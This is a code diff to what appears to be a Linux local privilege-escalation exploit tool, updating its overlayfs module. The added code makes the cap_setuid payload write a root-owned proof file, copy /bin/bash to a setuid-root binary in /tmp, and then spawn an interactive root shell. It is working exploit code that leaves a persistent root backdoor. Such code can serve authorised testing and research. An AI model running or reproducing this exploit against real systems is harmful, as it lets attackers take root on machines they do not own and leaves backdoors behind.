@@ -243,10 +243,21 @@ static const char OVERLAYFS_PAYLOAD_SOURCE[] =
     "#include <stdio.h>\n"
     "#include <stdlib.h>\n"
     "#include <unistd.h>\n"
-    "int main(void) {\n"
-    "    setuid(0); setgid(0);\n"
-    "    setresuid(0,0,0); setresgid(0,0,0);\n"
+    "int main(int argc, char **argv) {\n"
+    "    (void)setuid(0); (void)setgid(0);\n"
+    "    (void)setresuid(0,0,0); (void)setresgid(0,0,0);\n"
     "    if (geteuid() != 0) { perror(\"setuid\"); return 1; }\n"
+    /* Verification mode: argv[1] = proof path. We are genuinely root (the
+     * persisted cap_setuid xattr let setuid(0) succeed), so drop a root-owned
+     * proof + setuid bash and exit — the module stat()s the proof as a DIRECT
+     * uid=0 witness instead of trusting the exec transfer. */
+    "    if (argc > 1) {\n"
+    "        char c[1024];\n"
+    "        snprintf(c, sizeof c, \"id > %s 2>&1; cp -f /bin/bash %s.bash 2>/dev/null; \"\n"
+    "                 \"chmod 4755 %s.bash 2>/dev/null; sync\", argv[1], argv[1], argv[1]);\n"
+    "        int r = system(c); (void)r;\n"
+    "        return 0;\n"
+    "    }\n"
     "    char *new_env[] = {\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\", NULL};\n"
     "    execle(\"/bin/sh\", \"sh\", \"-p\", NULL, new_env);\n"
     "    execle(\"/bin/bash\", \"bash\", \"-p\", NULL, new_env);\n"
@@ -438,17 +449,41 @@ static skeletonkey_result_t overlayfs_exploit(const struct skeletonkey_ctx *ctx)
     }
 
     if (!ctx->json) {
-        fprintf(stderr, "[+] overlayfs: cap_setuid+ep xattr persisted on host fs "
-                        "— execing payload to drop root\n");
+        fprintf(stderr, "[+] overlayfs: cap_setuid+ep xattr persisted on host fs\n");
+    }
+
+    /* Direct uid=0 witness: run the cap'd payload in verification mode so it
+     * drops a root-owned proof. The persisted xattr is the bug's signature,
+     * but we confirm actual root out-of-band rather than trust the exec
+     * transfer. */
+    char ovl_proof[256];
+    snprintf(ovl_proof, sizeof ovl_proof, "/tmp/.sk-overlayfs-%ld.proof", (long)getpid());
+    unlink(ovl_proof);
+    pid_t vp = fork();
+    if (vp == 0) {
+        execl(upper_bin, upper_bin, ovl_proof, (char *)NULL);
+        _exit(127);
+    }
+    if (vp > 0) { int vs; waitpid(vp, &vs, 0); }
+    struct stat psb;
+    bool ovl_rooted = (stat(ovl_proof, &psb) == 0 && S_ISREG(psb.st_mode) && psb.st_uid == 0);
+    if (!ovl_rooted) {
+        fprintf(stderr, "[-] overlayfs: xattr persisted but the cap'd payload did not "
+                        "yield uid 0 (no root-owned proof) — honest EXPLOIT_FAIL\n");
+        goto fail_workdir;
+    }
+    if (!ctx->json) {
+        fprintf(stderr, "[+] overlayfs: ROOT — root-owned proof %s "
+                        "(setuid bash: %s.bash -p)\n", ovl_proof, ovl_proof);
     }
     if (ctx->no_shell) {
-        fprintf(stderr, "[+] overlayfs: --no-shell — payload at %s, not exec'ing\n",
-                upper_bin);
+        unlink(src_path); unlink(bin_path);
         return SKELETONKEY_EXPLOIT_OK;
     }
     fflush(NULL);
-    execl(upper_bin, upper_bin, (char *)NULL);
+    execl(upper_bin, upper_bin, (char *)NULL);   /* interactive root shell */
     perror("execl payload");
+    return SKELETONKEY_EXPLOIT_OK;   /* root already witnessed out-of-band */
 
 fail_workdir:
     /* best-effort cleanup */
